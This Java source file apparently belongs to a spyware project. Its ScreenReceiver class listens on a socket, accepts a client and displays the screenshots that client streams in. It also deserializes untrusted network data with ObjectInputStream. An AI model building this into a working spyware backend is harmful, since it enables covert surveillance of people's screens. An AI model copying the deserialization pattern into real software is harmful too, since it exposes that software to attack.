package com.example.spyware_server_fx;

import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import javax.imageio.ImageIO;

public class ScreenReceiver {
    private int port = 8050;
    private String host = "localhost";
    public volatile ServerSocket serverSocket = null;
    public Socket clientSocket = null;
    public ObjectInputStream inputStream = null;
    Thread t = null;
    private volatile boolean running = true;
    public class SocketClass{
        public Socket socket = null;
        public SocketClass(Socket socket){
            this.socket = socket;
        }
    }
    public ScreenReceiver(int port ){
        System.out.println("[ScreenReciever] constructor");
        this.port = port;
    }
    public ScreenReceiver(){
        this(8050);
    }

    public void start() {
        System.out.println("[ScreenReciever] stating");
        running = true;
        t = new Thread(new Runnable() {
            @Override
            public void run() {
                JFrame frame = null;
                try {
                    serverSocket = new ServerSocket(port);
                    System.out.println("Waiting for receiver to connect...");
                    clientSocket = serverSocket.accept();
                    System.out.println("Receiver connected.");
                    inputStream = new ObjectInputStream(clientSocket.getInputStream());

                    frame = new JFrame("Screen Sharing Receiver");
                    frame.addWindowListener(new WindowAdapter() {
                        @Override
                        public void windowClosing(WindowEvent e) {
                            // Perform actions on frame close
                            System.out.println("Frame is closing...");
                            // Add your code here
                            stopReceiving();
                            // Call super to properly close the frame
                            super.windowClosing(e);
                        }
                    });


                    frame.setSize(800, 600);
                    frame.setVisible(true);

                    JLabel label = new JLabel();
                    frame.add(label);

                    while (running) {
                        // Receive the image bytes from the socket connection
                        byte[] imageBytes = (byte[]) inputStream.readObject();

                        // Convert the image bytes back to BufferedImage
                        BufferedImage screenshot = ImageIO.read(new ByteArrayInputStream(imageBytes));

                        // Get the size of the label
                        int desiredWidth = frame.getWidth();
                        int desiredHeight = frame.getHeight()-40;

                        // Resize the image to fit inside the label
                        Image resizedImage = screenshot.getScaledInstance(desiredWidth, desiredHeight, Image.SCALE_SMOOTH);

                        // Set the resized image to the label
                        label.setIcon(new ImageIcon(resizedImage));

                        // Delay between each frame
                        Thread.sleep(100);
                    }
                } catch (IOException | ClassNotFoundException | InterruptedException e) {
                    e.printStackTrace();
                }
                finally {
                    System.out.println("[Screen Receiver] Closing all Streaming Server sockets and frame");
                    frame.dispose();
                    try {
                        inputStream.close();
                    } catch (Exception e) {
                        System.out.println("[ScreenReceiver] Failed to close inputStream socket");
                    }
                    try {
                        clientSocket.close();
                    } catch (Exception e) {
                        System.out.println("[ScreenReceiver] Failed to close client socket");
                    }
                    try {
                        serverSocket.close();
                    } catch (Exception e) {
                        System.out.println("[ScreenReceiver] Failed to close server socket");
                        System.out.println(e.getMessage());
                    }
                }
            }
        });
        t.start();

    }
    public void stopReceiving(){
        running = false;
//        try {
//            t.interrupt();
//        }catch (Exception e){
//            System.out.println("Failed to interrupt thread");
//        }
    }
}

